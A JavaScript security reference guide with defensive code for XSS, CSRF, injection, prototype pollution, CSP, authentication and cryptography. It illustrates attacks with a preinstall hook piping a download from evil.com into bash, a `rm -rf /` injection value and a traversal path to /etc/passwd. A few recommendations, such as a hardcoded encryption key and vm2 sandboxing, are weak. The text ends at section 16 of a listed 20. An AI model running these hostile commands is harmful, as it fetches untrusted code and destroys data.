# JavaScript Security Guide — The Complete Reference

> Version 1.0 · 2026 · Covers Browser, Node.js and Modern Frameworks

---

## Table of Contents

1. [XSS — Cross-Site Scripting](#1-xss)
2. [CSRF — Cross-Site Request Forgery](#2-csrf)
3. [Injection Attacks](#3-injection)
4. [Insecure Deserialization](#4-deserialization)
5. [Prototype Pollution](#5-prototype-pollution)
6. [ReDoS — Regular Expression Denial of Service](#6-redos)
7. [Clickjacking](#7-clickjacking)
8. [Insecure Data Storage](#8-storage)
9. [Dependency & Supply Chain Security](#9-supply-chain)
10. [Content Security Policy (CSP)](#10-csp)
11. [HTTPS, HSTS and Secure Cookies](#11-https-cookies)
12. [Authentication & Authorization](#12-auth)
13. [Cryptography in JS](#13-crypto)
14. [API & Fetch Security](#14-api-security)
15. [Web Workers & postMessage Security](#15-postmessage)
16. [Node.js — Server-Side Security](#16-nodejs)
17. [npm & Environment Security](#17-npm)
18. [Timing Attacks](#18-timing)
19. [Tools & Automation](#19-tools)
20. [Security Checklist](#20-checklist)

---

## 1. XSS — Cross-Site Scripting

XSS is the injection of malicious scripts into pages viewed by other users. It is **the #1 web attack vector**.

### Types of XSS

| Type | Description | Example |
|------|-------------|---------|
| **Reflected** | Script in the URL, immediately reflected in the response | `?q=<script>...` |
| **Stored** | Script saved to DB, shown to all users | Comment containing `<script>` |
| **DOM-based** | Script injected via DOM manipulation, no server involved | `location.hash` → `innerHTML` |
| **Mutation XSS (mXSS)** | Browser "corrects" HTML and creates an injection vector | Complex nested tags |

---

### 1.1 The `esc()` Function — HTML Escaping

The foundation of XSS defense: **never insert user input directly into HTML**.

```javascript
// ✅ Complete esc() for HTML context
function esc(str) {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g,  '&amp;')   // FIRST — otherwise double-escaping occurs
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;')
    .replace(/\//g, '&#x2F;')  // closes </script> inside attributes
    .replace(/`/g,  '&#x60;'); // closes template literals in attributes
}

// Usage
document.getElementById('output').innerHTML = esc(userInput);
```

> ⚠️ `esc()` works **only for HTML context**. Different contexts require different escaping!

---

### 1.2 Context-Aware Escaping

```javascript
// ── HTML Attribute ──────────────────────────────────────────────────────
// <div data-name="[USER INPUT]">
function escAttr(str) {
  return String(str ?? '').replace(/[^\w\s\-\.]/g, c =>
    `&#x${c.charCodeAt(0).toString(16).padStart(2,'0')};`
  );
}

// ── JavaScript Context ──────────────────────────────────────────────────
// var x = "[USER INPUT]";  — dangerous! Use JSON.stringify instead
function escJS(str) {
  return JSON.stringify(String(str ?? '')); // includes surrounding quotes
}
// <script>var name = <?= escJS($name) ?>;</script>

// ── URL Context ─────────────────────────────────────────────────────────
// href="[USER INPUT]"
function escURL(str) {
  try {
    const url = new URL(str);
    // Only allow safe protocols
    if (!['http:', 'https:', 'mailto:'].includes(url.protocol)) {
      return '#';
    }
    return encodeURI(url.toString());
  } catch {
    return '#'; // not a URL — block it
  }
}

// ── CSS Context ─────────────────────────────────────────────────────────
// style="color: [USER INPUT]"
function escCSS(str) {
  // Allow only safe CSS value characters
  return String(str ?? '').replace(/[^a-zA-Z0-9\s\-_#.,()%]/g, '');
}
```

---

### 1.3 Safe DOM Methods

```javascript
// ❌ DANGEROUS
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
element.insertAdjacentHTML('beforeend', userInput);
eval(userInput);
setTimeout(userInput, 0);      // string argument = eval!
new Function(userInput)();

// ✅ SAFE
element.textContent = userInput;    // always text, never HTML
element.setAttribute('data-x', userInput);
element.value = userInput;

// ✅ Safe innerHTML via DOMParser sanitization
function safeHTML(html) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  // Remove all scripts
  doc.querySelectorAll('script, object, embed, iframe, link[rel=import]')
     .forEach(el => el.remove());
  // Remove all on* attributes
  doc.querySelectorAll('*').forEach(el => {
    [...el.attributes].forEach(attr => {
      if (attr.name.startsWith('on') || attr.value.startsWith('javascript:')) {
        el.removeAttribute(attr.name);
      }
    });
  });
  return doc.body.innerHTML;
}
```

---

### 1.4 DOMPurify — Production-Grade Sanitization

```bash
npm install dompurify
```

```javascript
import DOMPurify from 'dompurify';

// Basic usage
const clean = DOMPurify.sanitize(dirtyHTML);
element.innerHTML = clean;

// Strict mode — text only
const text = DOMPurify.sanitize(dirtyHTML, { ALLOWED_TAGS: [] });

// Allow only safe tags
const limited = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title', 'target'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],
});

// Hook — additional URL validation
DOMPurify.addHook('afterSanitizeAttributes', node => {
  if ('href' in node) {
    const href = node.getAttribute('href') || '';
    if (!/^https?:\/\//i.test(href)) {
      node.setAttribute('href', '#');
    }
  }
});
```

---

### 1.5 Trusted Types API (Modern Browser Standard)

```javascript
// Enabled via CSP: require-trusted-types-for 'script'

if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('myapp', {
    createHTML: (input) => DOMPurify.sanitize(input),
    createScriptURL: (input) => {
      // Only allow our own CDN
      if (input.startsWith('https://cdn.myapp.com/')) return input;
      throw new Error('Untrusted script URL');
    },
    createScript: () => { throw new Error('eval is forbidden'); }
  });

  // Usage
  element.innerHTML = policy.createHTML(userHTML);
  scriptEl.src = policy.createScriptURL(url);
}
```

---

## 2. CSRF — Cross-Site Request Forgery

An attacker tricks the victim's browser into sending an authenticated request.

### 2.1 CSRF Tokens

```javascript
// ── Server sends the token in a meta tag ───────────────────────────────
// <meta name="csrf-token" content="abc123...">

// ── Client reads and sends it with every request ───────────────────────
const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;

// Fetch with CSRF token
async function secureFetch(url, options = {}) {
  return fetch(url, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
      ...options.headers,
    },
    credentials: 'same-origin',
  });
}

// Axios — global interceptor
axios.defaults.headers.common['X-CSRF-Token'] = csrfToken;
```

---

### 2.2 SameSite Cookies

```javascript
// Node.js / Express
res.cookie('sessionId', token, {
  httpOnly: true,     // JS cannot read
  secure: true,       // HTTPS only
  sameSite: 'strict', // 'strict' | 'lax' | 'none'
  maxAge: 3600000,    // 1 hour
  path: '/',
});

// SameSite=Strict — cookies NOT sent when navigating from another site
// SameSite=Lax    — cookies sent on safe methods (GET)
// SameSite=None   — always, but requires Secure flag
```

---

### 2.3 Origin/Referer Validation on the Server

```javascript
// Express middleware
function csrfOriginCheck(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const origin = req.headers.origin || req.headers.referer;
  const allowed = ['https://myapp.com', 'https://www.myapp.com'];

  if (!origin || !allowed.some(o => origin.startsWith(o))) {
    return res.status(403).json({ error: 'CSRF check failed' });
  }
  next();
}
```

---

## 3. Injection Attacks

### 3.1 SQL Injection (Node.js)

```javascript
// ❌ DANGEROUS — string concatenation
const query = `SELECT * FROM users WHERE name = '${userInput}'`;

// ✅ SAFE — parameterized queries

// node-postgres (pg)
const { rows } = await client.query(
  'SELECT * FROM users WHERE name = $1 AND role = $2',
  [userName, userRole]
);

// mysql2
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE name = ? AND age > ?',
  [userName, minAge]
);

// Knex.js — query builder
const users = await knex('users')
  .where({ name: userName, active: true })
  .select('id', 'email');

// Prisma — type-safe ORM
const user = await prisma.user.findFirst({
  where: { name: userName }
});
```

---

### 3.2 NoSQL Injection (MongoDB)

```javascript
// ❌ DANGEROUS
const user = await User.findOne({ name: req.body.name });
// If req.body.name = { $gt: '' } — returns ALL users!

// ✅ SAFE — type validation
function sanitizeMongoInput(input) {
  if (typeof input !== 'string') throw new Error('Invalid input type');
  // Strip MongoDB operators
  return input.replace(/\$|\./g, '');
}

// ✅ Use Mongoose with schema validation
const UserSchema = new mongoose.Schema({
  name: { type: String, required: true, maxlength: 100 }
});

// ✅ express-mongo-sanitize
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize()); // strips $ and . from req.body, req.params, req.query
```

---

### 3.3 Command Injection (Node.js)

```javascript
import { execFile, spawn } from 'child_process';

// ❌ DANGEROUS
exec(`convert ${userFile} output.pdf`);
// If userFile = "x; rm -rf /" — disaster

// ✅ execFile — no shell, args are separate
execFile('convert', [userFile, 'output.pdf'], (err, stdout) => {
  if (err) throw err;
  console.log(stdout);
});

// ✅ spawn — for streams
const proc = spawn('ls', ['-la', '/safe/directory'], {
  shell: false, // CRITICAL: disable shell
});

// ✅ Validate filenames
function validateFilename(name) {
  if (!/^[a-zA-Z0-9_\-\.]+$/.test(name)) {
    throw new Error('Invalid filename');
  }
  // Protect against path traversal
  const resolved = path.resolve('/uploads', name);
  if (!resolved.startsWith('/uploads/')) {
    throw new Error('Path traversal detected');
  }
  return resolved;
}
```

---

### 3.4 Path Traversal

```javascript
import path from 'path';
import fs from 'fs';

const BASE_DIR = '/app/uploads';

// ❌ DANGEROUS
app.get('/file', (req, res) => {
  res.sendFile(req.query.name); // ../../../../etc/passwd
});

// ✅ SAFE
app.get('/file', (req, res) => {
  const filename = path.basename(req.query.name); // filename only
  const fullPath = path.resolve(BASE_DIR, filename);

  // Double check — resolve can bypass basename
  if (!fullPath.startsWith(BASE_DIR + path.sep)) {
    return res.status(403).send('Forbidden');
  }

  if (!fs.existsSync(fullPath)) {
    return res.status(404).send('Not found');
  }

  res.sendFile(fullPath);
});
```

---

## 4. Insecure Deserialization

### 4.1 JSON.parse — Safe Deserialization

```javascript
// ✅ JSON.parse is safe by itself (does not execute code)
// But schema validation is still required!

// Without validation — dangerous for business logic
const data = JSON.parse(userInput); // may contain unexpected fields

// ✅ Validate with Zod
import { z } from 'zod';

const UserSchema = z.object({
  id: z.number().int().positive(),
  name: z.string().min(1).max(100),
  role: z.enum(['user', 'admin']),
  email: z.string().email(),
});

function parseUser(raw) {
  const data = JSON.parse(raw);
  return UserSchema.parse(data); // throws ZodError on mismatch
}

// ✅ With a reviver — type control during parsing
const data = JSON.parse(raw, (key, value) => {
  // Block prototype-polluting keys
  if (['__proto__', 'constructor', 'prototype'].includes(key)) {
    return undefined;
  }
  return value;
});
```

---

### 4.2 eval and Dangerous Functions

```javascript
// ❌ NEVER use with user input
eval(userCode);
new Function(userCode)();
setTimeout(userString, 0);
setInterval(userString, 0);
document.write(userHTML);

// ❌ Disguised eval
window['eval'](code);
(0, eval)(code);
globalThis['Function'](code)();

// ✅ If you need a sandbox — use a sandboxed iframe
const iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts'; // without allow-same-origin!
iframe.srcdoc = `<script>${trustedCode}</script>`;
document.body.appendChild(iframe);

// ✅ For Node.js — vm2 or isolated-vm
import { VM } from 'vm2';
const vm = new VM({ timeout: 1000, sandbox: { console } });
const result = vm.run(untrustedCode);
```

---

## 5. Prototype Pollution

Attacking `Object.prototype` can change the behavior of the entire application.

```javascript
// What the attack looks like
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
Object.assign({}, payload);
// Now ({}).isAdmin === true for ALL objects!

// ── Defense #1: Object.create(null) ───────────────────────────────────
const safeObj = Object.create(null); // no prototype
safeObj['__proto__'] = 'attack'; // just a plain string, not a prototype

// ── Defense #2: Key validation ─────────────────────────────────────────
function safeSet(obj, key, value) {
  const forbidden = ['__proto__', 'constructor', 'prototype'];
  if (forbidden.includes(key)) {
    throw new Error(`Forbidden key: ${key}`);
  }
  obj[key] = value;
}

// ── Defense #3: Object.freeze ──────────────────────────────────────────
Object.freeze(Object.prototype);
// Now mutating __proto__ throws in strict mode

// ── Defense #4: hasOwnProperty during iteration ────────────────────────
function mergeDeep(target, source) {
  for (const key of Object.keys(source)) { // Object.keys, not for..in
    if (key === '__proto__' || key === 'constructor') continue;
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = mergeDeep(target[key] ?? {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// ── Defense #5: Use Map for dynamic keys ──────────────────────────────
const store = new Map(); // no prototype, __proto__ is just a key
store.set(userKey, value);
```

---

## 6. ReDoS — Regular Expression Denial of Service

Evil regexes can hang with exponential execution time.

```javascript
// ❌ Vulnerable patterns (catastrophic backtracking)
/^(a+)+$/.test('aaaaaaaaaaaaaaaaaaaX');       // ~2^n steps
/(a|aa)+/.test('aaaaaaaaaaaaaaaaaaaaX');
/(\w+\s?)*$/.test('aaaa...X');

// ✅ Use concrete length limits
/^[a-z]{1,50}$/.test(input);    // bounded length
/^\d{1,10}$/.test(input);       // digits only

// ✅ Timeout wrapper for dangerous regexes (Node.js)
const { Worker } = require('worker_threads');

function safeRegex(pattern, input, timeoutMs = 100) {
  return new Promise((resolve, reject) => {
    const worker = new Worker(`
      const { parentPort, workerData } = require('worker_threads');
      const { pattern, input } = workerData;
      parentPort.postMessage(new RegExp(pattern).test(input));
    `, { eval: true, workerData: { pattern, input } });

    const timer = setTimeout(() => {
      worker.terminate();
      reject(new Error('Regex timeout — possible ReDoS'));
    }, timeoutMs);

    worker.on('message', result => {
      clearTimeout(timer);
      resolve(result);
    });
  });
}

// ✅ safe-regex library
import safeRegex from 'safe-regex';
if (!safeRegex(/^(a+)+$/)) {
  console.warn('Unsafe regex detected!');
}
```

---

## 7. Clickjacking

The attack hides the page behind a transparent iframe, intercepting user clicks.

```javascript
// ── Server-side protection — HTTP headers ─────────────────────────────
// X-Frame-Options: DENY               — block all frames
// X-Frame-Options: SAMEORIGIN         — allow same origin only
// Content-Security-Policy: frame-ancestors 'none'  — modern approach

// Express
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
  next();
});

// ── Frame-busting (JS — legacy method, headers are preferred) ─────────
if (window.top !== window.self) {
  window.top.location = window.self.location;
}

// ── Modern protection: CSP frame-ancestors ────────────────────────────
// More reliable than X-Frame-Options in modern browsers
// Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

---

## 8. Insecure Data Storage

### 8.1 localStorage / sessionStorage

```javascript
// ❌ DO NOT store in localStorage
localStorage.setItem('authToken', jwtToken);     // XSS steals the token
localStorage.setItem('password', userPassword);  // never!
localStorage.setItem('creditCard', '4111...');   // critical data

// ✅ Store in httpOnly cookies (inaccessible to JS)
// Server sets: Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict

// ✅ If you must store in localStorage — encrypt it
import { AES, enc } from 'crypto-js';

const SECRET = 'app-secret-key'; // in production, generate dynamically

function secureStore(key, value) {
  const encrypted = AES.encrypt(JSON.stringify(value), SECRET).toString();
  localStorage.setItem(key, encrypted);
}

function secureRead(key) {
  const encrypted = localStorage.getItem(key);
  if (!encrypted) return null;
  const bytes = AES.decrypt(encrypted, SECRET);
  return JSON.parse(bytes.toString(enc.Utf8));
}

// ✅ Clear on logout
function logout() {
  localStorage.clear();
  sessionStorage.clear();
  // Invalidate token on the server
  fetch('/api/logout', { method: 'POST', credentials: 'include' });
}
```

---

### 8.2 IndexedDB — Encryption

```javascript
// For sensitive data in IndexedDB, use the Web Crypto API
async function encryptData(data, key) {
  const encoder = new TextEncoder();
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoder.encode(JSON.stringify(data))
  );
  return { iv: Array.from(iv), data: Array.from(new Uint8Array(encrypted)) };
}
```

---

## 9. Dependency & Supply Chain Security

### 9.1 npm audit and Lockfile

```bash
# Check for vulnerabilities
npm audit
npm audit --audit-level=high   # high and critical only
npm audit fix                   # auto-fix
npm audit fix --force           # forced fix (use with caution)

# Update dependencies
npx npm-check-updates -u        # update package.json
npm install

# Deterministic installs
npm ci                          # uses package-lock.json strictly
```

---

### 9.2 Inspecting Packages Before Installing

```bash
# Preview package contents
npm pack <package> --dry-run
npx npm-explorer <package>

# Install scripts are dangerous!
# "preinstall": "curl evil.com | bash"
npm install --ignore-scripts   # disable preinstall/postinstall

# Socket.dev — analyze packages for threats
npx @socketsecurity/cli@latest info <package>
```

---

### 9.3 package.json — Constraints

```json
{
  "engines": {
    "node": ">=18.0.0",
    "npm": ">=9.0.0"
  },
  "overrides": {
    "vulnerable-package": ">=2.1.0"
  }
}
```

```
# .npmrc — secure settings
ignore-scripts=true          ← disable install scripts
audit=true                   ← auto-audit on install
save-exact=true              ← pin exact versions (no ^ or ~)
registry=https://registry.npmjs.org/
```

---

### 9.4 Subresource Integrity (SRI)

```html
<!-- Always use integrity for CDN scripts -->
<script
  src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
  integrity="sha256-qXBd/EfAdjOA2FGrGAG+b3YBn2tn5A6bhz+LSgYD96k="
  crossorigin="anonymous">
</script>
```

```javascript
// Generate SRI hashes in Node.js
import crypto from 'crypto';
import fs from 'fs';

function generateSRI(filePath) {
  const content = fs.readFileSync(filePath);
  const hash = crypto.createHash('sha256').update(content).digest('base64');
  return `sha256-${hash}`;
}
```

---

## 10. Content Security Policy (CSP)

CSP is a powerful mechanism that restricts resource sources.

```javascript
// Express — advanced CSP via helmet
import helmet from 'helmet';

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      // DO NOT use 'unsafe-inline' or 'unsafe-eval'!
      // For required inline scripts — use a nonce
      (req, res) => `'nonce-${res.locals.nonce}'`,
    ],
    styleSrc: ["'self'", "'unsafe-inline'"], // inline styles — a compromise
    imgSrc: ["'self'", 'data:', 'https://images.myapp.com'],
    connectSrc: ["'self'", 'https://api.myapp.com', 'wss://ws.myapp.com'],
    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
    objectSrc: ["'none'"],           // disable Flash/PDF plugins
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],            // block iframes
    workerSrc: ["'self'", 'blob:'],
    manifestSrc: ["'self'"],
    baseUri: ["'self'"],             // protect against base-tag injection
    formAction: ["'self'"],          // where forms can submit
    upgradeInsecureRequests: [],     // auto-upgrade HTTP → HTTPS
    reportUri: '/api/csp-report',    // receive violation reports
  },
  reportOnly: false, // true = log only, do not block
}));

// Generate a nonce for every request
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});
```

```html
<!-- Using the nonce in HTML -->
<script nonce="<%= nonce %>">
  // This script is allowed
  const app = initApp();
</script>
```

---

## 11. HTTPS, HSTS and Secure Cookies

```javascript
// Express — HTTPS redirect + HSTS
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    return res.redirect(301, `https://${req.header('host')}${req.url}`);
  }
  next();
});

app.use(helmet.hsts({
  maxAge: 31536000,           // 1 year (recommended)
  includeSubDomains: true,    // all subdomains
  preload: true,              // for HSTS preload list
}));

// Secure cookies — full set of flags
const cookieOptions = {
  httpOnly: true,       // JS cannot read
  secure: true,         // HTTPS only
  sameSite: 'strict',   // CSRF protection
  maxAge: 3600000,      // 1 hour
  domain: '.myapp.com', // this domain only
  path: '/',
  signed: true,         // signed via cookieParser(secret)
};

res.cookie('sessionId', generateSessionId(), cookieOptions);

// Reading signed cookies
app.use(cookieParser(process.env.COOKIE_SECRET));
app.get('/profile', (req, res) => {
  const sessionId = req.signedCookies.sessionId; // verified!
});
```

---

## 12. Authentication & Authorization

### 12.1 JWT — Secure Usage

```javascript
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET; // minimum 256 bits
const JWT_OPTIONS = {
  algorithm: 'HS256',       // or RS256 for public-key crypto
  expiresIn: '15m',         // short lifespan!
  issuer: 'myapp.com',
  audience: 'myapp-users',
};

// Create tokens
function createTokens(userId, role) {
  const accessToken = jwt.sign(
    { sub: userId, role, type: 'access' },
    JWT_SECRET,
    JWT_OPTIONS
  );

  const refreshToken = jwt.sign(
    { sub: userId, type: 'refresh' },
    process.env.REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  return { accessToken, refreshToken };
}

// Verify token
function verifyToken(token) {
  try {
    return jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'], // CRITICAL: specify algorithm explicitly
      issuer: 'myapp.com',   // prevents alg:none attack!
      audience: 'myapp-users',
    });
  } catch (err) {
    throw new Error('Invalid token');
  }
}

// ❌ DO NOT store JWT in localStorage (XSS risk)
// ✅ Store accessToken in memory, refreshToken in an httpOnly cookie
let accessToken = null; // in memory — lives until page reload

async function refreshAccessToken() {
  const res = await fetch('/api/refresh', {
    method: 'POST',
    credentials: 'include', // sends httpOnly refresh cookie
  });
  const { accessToken: newToken } = await res.json();
  accessToken = newToken;
  return newToken;
}
```

---

### 12.2 Password Hashing

```javascript
import bcrypt from 'bcrypt';
import argon2 from 'argon2';

// bcrypt — proven standard
const SALT_ROUNDS = 12; // minimum 10, recommended 12-14

async function hashPassword(password) {
  if (password.length > 72) {
    throw new Error('Password too long for bcrypt');
  }
  return bcrypt.hash(password, SALT_ROUNDS);
}

async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash); // timing-safe
}

// argon2 — modern, recommended by OWASP
async function hashPasswordArgon2(password) {
  return argon2.hash(password, {
    type: argon2.argon2id,     // side-channel and GPU resistant
    memoryCost: 65536,         // 64 MB
    timeCost: 3,               // iterations
    parallelism: 4,
  });
}

// ❌ NEVER use these for passwords
// MD5, SHA1, SHA256 — fast, brute-force vulnerable
// crypto.createHash('sha256').update(password).digest('hex')
```

---

### 12.3 Rate Limiting & Brute Force Protection

```javascript
import rateLimit from 'express-rate-limit';
import slowDown from 'express-slow-down';

// General rate limit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                  // requests per IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, please try again later' },
});

// Strict limit for authentication
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                    // 5 login attempts
  skipSuccessfulRequests: true,
});

// Progressive slowdown
const speedLimiter = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 3,             // slow down after 3 requests
  delayMs: (hits) => hits * 200, // +200ms per hit
});

app.use('/api/', limiter);
app.post('/api/login', speedLimiter, authLimiter, loginHandler);
```

---

## 13. Cryptography in JS

### 13.1 Web Crypto API — Browser Standard

```javascript
// ── Generate random bytes ─────────────────────────────────────────────
const randomBytes = crypto.getRandomValues(new Uint8Array(32));
const randomToken = Array.from(randomBytes, b => b.toString(16).padStart(2,'0')).join('');

// ── Hashing ───────────────────────────────────────────────────────────
async function sha256(message) {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return Array.from(new Uint8Array(hash))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

// ── AES-GCM Encryption ────────────────────────────────────────────────
async function generateAESKey() {
  return crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    true,   // extractable
    ['encrypt', 'decrypt']
  );
}

async function encrypt(plaintext, key) {
  const iv = crypto.getRandomValues(new Uint8Array(12)); // 96-bit IV
  const encoder = new TextEncoder();
  const ciphertext = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoder.encode(plaintext)
  );
  // Prefix IV to the ciphertext
  const result = new Uint8Array(iv.length + ciphertext.byteLength);
  result.set(iv, 0);
  result.set(new Uint8Array(ciphertext), iv.length);
  return btoa(String.fromCharCode(...result));
}

async function decrypt(cipherBase64, key) {
  const data = Uint8Array.from(atob(cipherBase64), c => c.charCodeAt(0));
  const iv = data.slice(0, 12);
  const ciphertext = data.slice(12);
  const plaintext = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv },
    key,
    ciphertext
  );
  return new TextDecoder().decode(plaintext);
}

// ── ECDH — Key Exchange ───────────────────────────────────────────────
async function generateECDHKeyPair() {
  return crypto.subtle.generateKey(
    { name: 'ECDH', namedCurve: 'P-256' },
    false, // private key is not extractable
    ['deriveKey']
  );
}

// ── Timing-safe comparison ────────────────────────────────────────────
async function timingSafeEqual(a, b) {
  const encoder = new TextEncoder();
  const [keyA, keyB] = await Promise.all([
    crypto.subtle.importKey('raw', encoder.encode(a), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']),
    crypto.subtle.importKey('raw', encoder.encode(b), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']),
  ]);
  const data = encoder.encode('comparison');
  const [sigA, sigB] = await Promise.all([
    crypto.subtle.sign('HMAC', keyA, data),
    crypto.subtle.sign('HMAC', keyB, data),
  ]);
  const arrA = new Uint8Array(sigA);
  const arrB = new Uint8Array(sigB);
  let diff = 0;
  for (let i = 0; i < arrA.length; i++) diff |= arrA[i] ^ arrB[i];
  return diff === 0;
}

// Node.js — built-in safe comparison
import crypto from 'crypto';
const isEqual = crypto.timingSafeEqual(
  Buffer.from(tokenA),
  Buffer.from(tokenB)
);
```

---

## 14. API & Fetch Security

```javascript
// ── Secure fetch wrapper ──────────────────────────────────────────────
const API_BASE = 'https://api.myapp.com';
const MAX_RESPONSE_SIZE = 10 * 1024 * 1024; // 10 MB

async function apiFetch(endpoint, options = {}) {
  // Validate endpoint — relative paths only
  if (!endpoint.startsWith('/') || endpoint.includes('..')) {
    throw new Error('Invalid endpoint');
  }

  const url = `${API_BASE}${endpoint}`;
  const token = await getAccessToken(); // refresh if needed

  const response = await fetch(url, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${token}`,
      'X-Request-ID': crypto.randomUUID(),
      ...options.headers,
    },
    credentials: 'same-origin',
    signal: AbortSignal.timeout(10000), // 10 second timeout
  });

  // Check response size
  const contentLength = response.headers.get('content-length');
  if (contentLength && parseInt(contentLength) > MAX_RESPONSE_SIZE) {
    throw new Error('Response too large');
  }

  if (!response.ok) {
    const error = await response.json().catch(() => ({}));
    throw new APIError(response.status, error.message);
  }

  // Verify Content-Type
  const contentType = response.headers.get('content-type');
  if (!contentType?.includes('application/json')) {
    throw new Error('Unexpected response type');
  }

  return response.json();
}

// ── CORS — server configuration ───────────────────────────────────────
import cors from 'cors';

const corsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = ['https://myapp.com', 'https://www.myapp.com'];
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  credentials: true,
  maxAge: 86400,             // preflight cache 24 hours
  optionsSuccessStatus: 204,
};

app.use(cors(corsOptions));
```

---

## 15. Web Workers & postMessage Security

```javascript
// ── postMessage — always validate origin ──────────────────────────────
window.addEventListener('message', (event) => {
  // ❌ DO NOT accept: event.origin === '*'
  // ✅ Explicit allowlist
  const TRUSTED_ORIGINS = ['https://myapp.com', 'https://widget.myapp.com'];

  if (!TRUSTED_ORIGINS.includes(event.origin)) {
    console.warn('Message from untrusted origin:', event.origin);
    return;
  }

  // Validate message structure
  const { type, payload } = event.data || {};
  if (typeof type !== 'string' || !type.match(/^[a-zA-Z_]+$/)) {
    return;
  }

  switch (type) {
    case 'UPDATE_CART':
      handleCartUpdate(payload);
      break;
    default:
      console.warn('Unknown message type:', type);
  }
});

// ── Sending messages — always specify targetOrigin ────────────────────
// ❌ DANGEROUS
iframe.contentWindow.postMessage(data, '*');

// ✅ SAFE
iframe.contentWindow.postMessage(data, 'https://trusted.com');

// ── Web Workers — isolate dangerous code ──────────────────────────────
const worker = new Worker('/workers/processor.js');

// Workers have no access to DOM, window, or document
// But they CAN call fetch — always validate data!

// processor.js (Worker)
self.addEventListener('message', async (e) => {
  const { data, type } = e.data;

  if (!isValidInput(data)) {
    self.postMessage({ error: 'Invalid input' });
    return;
  }

  const result = await processData(data);
  self.postMessage({ result });
});
```

---

## 16. Node.js — Server-Side Security

```javascript
// ── Helmet — security headers bundle ─────────────────────────────────
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: { /* ... */ },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-site' },
  dnsPrefetchControl: { allow: false },
  frameguard: { action: 'deny' },
  hsts: { maxAge: 31536000, includeSubDomains: true },
  ieNoOpen: true,
  noSniff: true,              // X-Content-Type-Options: nosniff
  originAgentCluster: true,
  permittedCrossDomainPolicies: false,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  xssFilter: true,
}));

// ── Limit request body size ────────────────────────────────────────────
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ limit: '10kb', extended: false }));

// ── HPP — HTTP Parameter Pollution ────────────────────────────────────
import hpp from 'hpp';
app.use(hpp()); // ?role=user&role=admin → takes only the last value

// ── Validate environment variables at startup ─────────────────────────
import { z } from 'zod';

const EnvSchema = z.object({
  NODE_ENV: z.enum(['development', 'test', 'production']),
  PORT: z.string().transform(Number).pipe(z.number().int().positive()),
  DATABASE_URL: z.string().url(),
  JWT_SECRET: z.string().min(32),
  COOKIE_SECRET: z.string().min(32),
});

const env = EnvSchema.parse(process.env);

// ── Safe error handling ───────────────────────────────────────────────
// ❌ Leaking stack traces in production
app.use((err, req, res, next) => {
  console.error(err); // log everything internally
  res.status(500).json({
    error: process.env.NODE_ENV === 'production'
      ? 'Internal server error'   // nothing revealing
      : err.message               // dev only
  });
});

// ── Validate query parameters ──────────────────────────────────────────
app.get('/users', (req, res) => {
  const page = Math.max(1, parseInt(req.query.page) || 1);
  const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 20));
  // ...
});
